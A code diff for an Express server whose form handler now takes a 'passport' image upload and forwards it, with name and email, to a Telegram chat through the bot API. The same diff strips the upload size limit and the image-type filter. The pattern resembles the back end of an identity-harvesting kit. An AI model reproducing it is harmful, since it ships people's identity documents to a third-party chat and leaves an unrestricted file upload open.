@@ -24,37 +24,14 @@ app.get('/api/data', (req, res) => {
 
 // Minimal multer configuration - just for file storage
 const upload = multer({
-    dest: 'uploads/',
-    limits: {
-        fileSize: 10 * 1024 * 1024, // 10MB limit
-    },
-    fileFilter: (req, file, cb) => {
-        if (file.mimetype.startsWith('image/')) {
-            cb(null, true);
-        } else {
-            cb(new Error('Only image files are allowed!'), false);
-        }
-    }
-});
+    dest: 'uploads/', });
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
 // Function to send image to Telegram
-async function sendImageToTelegram(imagePath) {
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('photo', fs.createReadStream(imagePath));
 
-    const response = await axios.post(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-        formData,
-        { headers: formData.getHeaders() }
-    );
-    
-    return response.data;
-}
 // Function to send message to Telegram
 async function sendToTelegram(message) {
     try {
@@ -74,15 +51,26 @@ async function sendToTelegram(message) {
 }
 
 // Route to handle form submission
-app.post('/api/data', async (req, res) => {
+app.post('/api/data', upload.single('passport'), async (req, res) => {
     try {
         const { name, email } = req.body;
+        const image = req.file;
         
         // Validate required fields
         if (!name || !email) {
             return res.status(400).json({
                 error: 'All fields are required'
             });
+        }
+        // Image to telegram
+        if (image) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', fs.createReadStream(image.path));
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, formData, {
+                headers: formData.getHeaders()
+            });
+            fs.unlinkSync(image.path); // Cleanup
         }
         
         // Format message for Telegram
